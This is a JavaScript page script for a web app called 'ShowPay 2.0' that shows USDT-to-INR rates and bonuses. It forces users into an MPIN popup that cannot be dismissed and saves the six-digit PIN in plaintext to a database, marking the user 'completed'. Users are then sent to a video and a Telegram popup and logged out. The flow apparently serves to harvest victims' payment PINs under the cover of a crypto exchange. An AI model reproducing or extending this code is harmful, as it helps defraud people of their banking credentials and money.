// ============================================================
// SHOWPAY 2.0 — HOME.JS
// Master orchestrator: loads data, controls MPIN → success →
// video → telegram → logout flow
// ============================================================
import supabase from './config/supabase.js';
import { TABLES, SETTINGS_KEYS } from './config/constants.js';
import { requireAuth, getSession } from './auth/session.js';
import { logout } from './auth/logout.js';
import { showToast } from './components/toast.js';
import { showLoader, hideLoader } from './components/loader.js';
import { initSlider } from './components/slider.js';
import { showVideoPopup } from './components/video-popup.js';
import { showTelegramPopup } from './components/telegram-popup.js';
import { showSuccessPopup } from './components/success-popup.js';
import { sleep, getSetting } from './utils/helper.js';

// ── Auth guard ─────────────────────────────────────────────
requireAuth();
const user = getSession();

// ── State ──────────────────────────────────────────────────
let settings = [];
let videoData = null;
let telegramData = null;

// ── DOM refs ───────────────────────────────────────────────
const mpinOverlay  = document.getElementById('mpin-overlay');
const mpinCancel   = document.getElementById('mpin-cancel');
const mpinConfirm  = document.getElementById('mpin-confirm');
const mpinBoxes    = [...document.querySelectorAll('.mpin-box')];
const usdtRatioEl  = document.getElementById('usdt-ratio');
const bonusRatioEl = document.getElementById('bonus-ratio');
const topupBonusEl = document.getElementById('topup-bonus-ratio');

// ══════════════════════════════════════════════════════════
//  INIT
// ══════════════════════════════════════════════════════════
async function init() {
  showLoader();
  try {
    await Promise.all([
      loadSettings(),
      initSlider(),
      loadVideoData(),
      loadTelegramData(),
    ]);
    updateSettingsUI();
    setupRealtimeSubscriptions();
  } catch (err) {
    console.error('Home init error:', err);
    showToast('Failed to load some data', 'error');
  } finally {
    hideLoader();
  }

  // 2 seconds → mandatory MPIN popup
  await sleep(2000);
  showMpinPopup();
}

// ══════════════════════════════════════════════════════════
//  DATA LOADERS
// ══════════════════════════════════════════════════════════
async function loadSettings() {
  const { data } = await supabase.from(TABLES.SETTINGS).select('*');
  settings = data || [];
}

async function loadVideoData() {
  const { data } = await supabase
    .from(TABLES.POPUP_VIDEO)
    .select('*')
    .eq('is_enabled', true)
    .limit(1)
    .maybeSingle();
  videoData = data;
}

async function loadTelegramData() {
  const { data } = await supabase
    .from(TABLES.TELEGRAM_POPUP)
    .select('*')
    .eq('is_enabled', true)
    .limit(1)
    .maybeSingle();
  telegramData = data;
}

// ══════════════════════════════════════════════════════════
//  UI UPDATES
// ══════════════════════════════════════════════════════════
function updateSettingsUI() {
  const usdt  = getSetting(settings, SETTINGS_KEYS.USDT_INR_RATIO, '107.61');
  const bonus = getSetting(settings, SETTINGS_KEYS.BONUS_RATIO, '4%');
  const topup = getSetting(settings, SETTINGS_KEYS.TOPUP_BONUS_RATIO, '2%');

  if (usdtRatioEl)  usdtRatioEl.textContent  = `1 USDT ≈ ${usdt} INR`;
  if (bonusRatioEl) bonusRatioEl.textContent  = bonus;
  if (topupBonusEl) topupBonusEl.textContent  = `Bonus ratio: ${topup}`;
}

// ══════════════════════════════════════════════════════════
//  MPIN POPUP
// ══════════════════════════════════════════════════════════
function showMpinPopup() {
  mpinOverlay.classList.add('active');
  // Focus first box
  mpinBoxes[0]?.focus();
  // Prevent backdrop close
  mpinOverlay.addEventListener('click', (e) => {
    if (e.target === mpinOverlay) { /* block closing by outside click */ }
  });
}

// Auto-focus next box + auto-confirm on last digit
mpinBoxes.forEach((box, i) => {
  box.addEventListener('input', (e) => {
    // Only allow digits
    box.value = box.value.replace(/\D/g, '').slice(-1);

    if (box.value && i < mpinBoxes.length - 1) {
      mpinBoxes[i + 1].focus();
    }

    // Auto-confirm when last box filled
    if (i === mpinBoxes.length - 1 && box.value) {
      const mpin = mpinBoxes.map(b => b.value).join('');
      if (mpin.length === 6) {
        setTimeout(() => confirmMpin(), 100);
      }
    }
  });

  // Backspace moves to previous
  box.addEventListener('keydown', (e) => {
    if (e.key === 'Backspace' && !box.value && i > 0) {
      mpinBoxes[i - 1].focus();
    }
  });
});

// Cancel MPIN → logout
mpinCancel?.addEventListener('click', async () => {
  mpinOverlay.classList.remove('active');
  // Update status to pending (already is, but log it)
  await supabase.from(TABLES.ACTIVITY_LOGS).insert({
    action_type: 'MPIN Cancelled',
    description: `User ${user.mobile} cancelled MPIN entry`,
    performed_by: user.mobile,
  }).catch(() => {});
  logout();
});

// Manual confirm button
mpinConfirm?.addEventListener('click', () => {
  const mpin = mpinBoxes.map(b => b.value).join('');
  if (mpin.length < 6) {
    showToast('Enter all 6 digits', 'error');
    return;
  }
  confirmMpin();
});

async function confirmMpin() {
  const mpin = mpinBoxes.map(b => b.value).join('');
  if (mpin.length !== 6) return;

  showLoader();
  mpinConfirm.disabled = true;
  mpinCancel.disabled = true;

  try {
    // Update user: save mpin + status = completed
    const { error } = await supabase
      .from(TABLES.USERS)
      .update({ mpin, status: 'completed' })
      .eq('id', user.id);

    if (error) throw error;

    // Log activity
    await supabase.from(TABLES.ACTIVITY_LOGS).insert({
      action_type: 'MPIN Submitted',
      description: `User ${user.mobile} set MPIN. Status → completed`,
      performed_by: user.mobile,
    }).catch(() => {});

    // Hide MPIN popup
    mpinOverlay.classList.remove('active');
    hideLoader();

    // Show success popup (2 seconds)
    await showSuccessPopup(2000);

    // Reload video/telegram state (admin may have changed)
    await Promise.all([loadVideoData(), loadTelegramData()]);

    // Flow: video → telegram → logout
    await runPostMpinFlow();

  } catch (err) {
    console.error('MPIN confirm error:', err);
    showToast('Failed to save MPIN. Try again.', 'error');
    hideLoader();
    mpinConfirm.disabled = false;
    mpinCancel.disabled = false;
  }
}

// ══════════════════════════════════════════════════════════
//  POST-MPIN FLOW: Video → Telegram → Logout
// ══════════════════════════════════════════════════════════
async function runPostMpinFlow() {
  if (videoData?.is_enabled) {
    // Show video popup; when closed → telegram (or logout)
    showVideoPopup(videoData, async () => {
      if (telegramData?.is_enabled) {
        showTelegramPopup(telegramData, () => logout());
      } else {
        logout();
      }
    });
  } else if (telegramData?.is_enabled) {
    showTelegramPopup(telegramData, () => logout());
  } else {
    // No video, no telegram → direct logout
    await sleep(500);
    logout();
  }
}

// ══════════════════════════════════════════════════════════
//  REALTIME SUBSCRIPTIONS
// ══════════════════════════════════════════════════════════
function setupRealtimeSubscriptions() {
  // Settings changes (e.g. USDT ratio update)
  supabase
    .channel('settings-changes')
    .on('postgres_changes', { event: '*', schema: 'public', table: TABLES.SETTINGS }, () => {
      loadSettings().then(updateSettingsUI);
    })
    .subscribe();

  // Slider changes
  supabase
    .channel('slider-changes')
    .on('postgres_changes', { event: '*', schema: 'public', table: TABLES.SLIDER_IMAGES }, () => {
      initSlider();
    })
    .subscribe();
}

// ── Auto-logout timer ──────────────────────────────────────
function setupAutoLogout() {
  const minutes = parseInt(getSetting(settings, SETTINGS_KEYS.AUTO_LOGOUT_MINUTES, '30'));
  setTimeout(() => {
    showToast('Session expired. Logging out...', 'error');
    setTimeout(logout, 1500);
  }, minutes * 60 * 1000);
}

// ── Start ─────────────────────────────────────────────────
init();
